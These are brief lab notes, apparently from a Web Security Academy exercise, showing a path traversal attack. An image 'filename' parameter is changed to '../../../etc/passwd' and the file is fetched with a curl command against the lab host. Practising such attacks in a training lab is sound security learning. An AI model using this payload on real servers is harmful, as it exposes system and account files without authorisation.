1) visit the homepage and visit a product
2) open the imaghe into another tab and change ?filename=111.jpg to ?filename=../../../etc/passwd

3) browsers will not show the results because the image has an error but we can use curl
     curl https://0a930055048a789782dc015d00d90021.web-security-academy.net/image?filename=../../../../etc/passwd

4) in this way we can read the passwd file
